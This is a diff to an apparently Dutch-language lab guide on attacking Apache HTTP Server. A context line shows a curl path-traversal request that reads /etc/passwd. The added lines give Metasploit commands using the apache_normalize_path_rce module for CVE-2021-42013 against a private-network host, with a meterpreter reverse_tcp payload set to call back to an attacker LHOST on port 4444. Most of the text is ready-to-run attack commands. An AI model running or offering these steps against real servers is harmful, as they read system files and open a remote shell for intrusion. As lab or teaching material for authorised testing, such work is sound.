@@ -28,4 +28,27 @@ curl -v --path-as-is http://192.168.0.145:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/pas
 
 Als je deze command uitvoert, zou je de inhoud van het bestand /etc/passwd moeten zien. Dit bestand bevat informatie over de gebruikers op het systeem.
 
+Metasploitable gebruiken:
+
 ```bash
+msfconsole
+```
+
+```bash
+use exploit/multi/http/apache_normalize_path_rce
+```
+
+```bash
+set RHOSTS 192.168.0.134
+set RPORT 80
+set SSL false
+set TARGETURI /cgi-bin
+set CVE CVE-2021-42013
+set LHOST 192.168.0.251
+set LPORT 4444
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+```
+
+```bash
+run
+```
